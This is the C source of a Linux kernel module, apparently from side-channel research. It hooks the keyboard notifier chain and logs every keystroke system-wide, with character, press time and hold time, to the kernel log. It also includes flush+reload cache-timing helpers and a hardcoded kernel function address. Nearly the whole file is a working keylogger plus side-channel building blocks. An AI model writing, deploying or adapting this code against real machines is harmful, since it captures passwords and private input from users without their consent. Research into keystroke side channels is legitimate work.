#include <linux/delay.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/kthread.h>
#include <linux/ktime.h>
#include <linux/module.h>
#include <linux/sched.h>

static struct notifier_block nb;
static u64 start_time = 0;
static u64 last_press = 0;

// execution time of the flush+reload thread in seconds
#define EXEC_TIME 10

#define LINE_SIZE 64

#define FUNCTION_ADDRESS 0xffffffff90c8eac0

u64 fenced_rdtsc(void);
void mfence(void);
void flush(void *p);
void maccess(void *p);
int flush_reload_t(void *ptr);

u64 fenced_rdtsc(void) {
  u64 a, d;
  asm volatile("mfence");
  asm volatile("rdtscp" : "=a"(a), "=d"(d)::"rcx");
  a = (d << 32) | a;
  asm volatile("mfence");
  return a;
}

void mfence(void) { asm volatile("mfence"); }

void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }

void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

int flush_reload_t(void *ptr) {
  uint64_t start = 0, end = 0;

  start = fenced_rdtsc();
  maccess(ptr);
  end = fenced_rdtsc();

  mfence();

  flush(ptr);

  return (int)(end - start);
}

/* Callback function to intercept keypresses */
static int keylogger_notify(struct notifier_block *nb, unsigned long action,
                            void *data) {
  struct keyboard_notifier_param *param =
      (struct keyboard_notifier_param *)data;

  if (action == KBD_KEYSYM) { // Check if a key is pressed
    u64 t1 = fenced_rdtsc();
    if (param->down) {
      printk(KERN_INFO "{\'type\': \'press\', \'key-char\': \'%c\', "
                       "\'keystroke-time\': %llu}",
             param->value - 64353 + 'a', t1 - start_time);
      last_press = t1;
    } else {
      printk(KERN_INFO "{\'type\': \'release\', \'key-char\': \'%c\', "
                       "\'keystroke-time\': %llu, \'keyhold\': %llu}",
             param->value - 64353 + 'a', t1 - start_time, t1 - last_press);
    }
  }

  return NOTIFY_OK;
}

static int __init my_module_init(void) {
  nb.notifier_call = keylogger_notify;
  register_keyboard_notifier(&nb);
  start_time = fenced_rdtsc();
  printk(KERN_INFO "keylogging module loaded");
  return 0; // Success
}

static void __exit my_module_exit(void) {
  unregister_keyboard_notifier(&nb);
  printk(KERN_INFO "keylogging module unloaded");
}

module_init(my_module_init);
module_exit(my_module_exit);
MODULE_LICENSE("GPL");
